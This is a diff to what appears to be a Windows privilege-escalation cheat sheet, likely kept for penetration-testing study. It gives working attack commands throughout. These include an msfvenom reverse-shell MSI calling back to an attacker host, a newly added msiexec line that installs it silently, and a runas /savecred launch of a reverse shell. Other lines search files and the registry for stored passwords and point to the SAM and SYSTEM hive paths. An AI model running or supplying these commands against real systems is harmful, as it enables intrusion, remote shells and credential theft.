@@ -71,17 +71,17 @@ Search
 Confirm perms - overwrite the program? (May need to upload accesschk) 
 
     accesschk /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
-
 ### AlwaysInstallElevated
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
+    #upload reverse reverse shell to C:\temp  
+    msiexec /quiet /qn /i C:\Temp\reverse.msi
 ## Passwords
     findstr /si password *.xml *.ini *.txt *.config 2>nul    
     dir /s *pass* == *vnc* == *.config* 2>nul    
     
     dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul    
-    
 ### Saved creds
     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
     cmdkey /list   
@@ -91,7 +91,7 @@ Confirm perms - overwrite the program? (May need to upload accesschk)
     runas /savecred /user:[user name] C:\PrivEsc\reverse.exe
 ### Creds in Registry 
     reg query HKLM /f password /t REG_SZ /s
-    reg query HKCU /f password /t REG_SZ /s
+    reg query HKCU /f password /t REG_SZ /s 
 ### SAM and SYSTEM Files
     %SYSTEMROOT%\repair\SAM
     %SYSTEMROOT%\System32\config\RegBack\SAM
